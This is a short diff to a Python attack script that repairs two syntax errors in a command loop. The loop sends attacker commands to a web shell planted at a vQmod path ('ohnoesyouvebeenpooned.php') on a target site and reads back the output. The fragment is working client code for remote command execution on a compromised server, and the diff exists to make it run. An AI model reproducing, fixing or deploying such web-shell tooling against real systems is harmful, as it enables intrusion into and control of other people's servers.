@@ -99,9 +99,9 @@ class loop(Cmd):
 
     def getfuktm8(self, cmd_response):
         target = url + "../vqmod/xml/ohnoesyouvebeenpooned.php?getfukt=" + cmd_response
-        cmd_response == requests.get(target)
+        cmd_response = requests.get(target)
         try:
-            if cmd_response.status_code = 200:
+            if cmd_response.status_code == 200:
                 return cmd_response.content
         except:
             return None
